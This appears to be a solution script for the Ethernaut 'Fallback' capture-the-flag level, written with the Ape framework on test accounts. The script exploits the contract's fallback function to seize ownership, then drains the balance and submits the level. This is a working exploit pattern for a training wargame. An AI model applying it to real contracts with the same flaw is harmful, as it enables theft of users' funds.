from ape import accounts, project
from ..utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    contract = project.Fallback.at(instance)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    print(f"\n--- The instance's owner before the exploit: {contract.owner()} ---\n")

    with accounts.use_sender(user):
        contract.contribute(value="1 wei")

        assert contract.getContribution(sender=user) > 0, "contribute first"

        user.transfer(instance, "1 wei")

        assert contract.owner() == user, "!owner"

        contract.withdraw()

        assert contract.balance == 0, "balance !zero"

    print(f"\n--- The instance's balance after the exploit: {contract.balance} ---\n")
    print(f"\n--- The instance's owner after the exploit: {contract.owner()} ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
